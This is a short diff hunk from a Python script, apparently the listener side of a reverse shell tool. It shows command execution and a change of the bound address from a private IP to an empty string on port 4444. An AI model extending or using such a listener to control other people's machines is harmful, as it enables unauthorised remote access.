@@ -65,5 +65,5 @@ class Listener:
                 result = self.ejec(command_parts)
                 print(result)
 
-eschucha = Listener("192.168.0.107", 4444)
+eschucha = Listener("", 4444)
 eschucha.run()
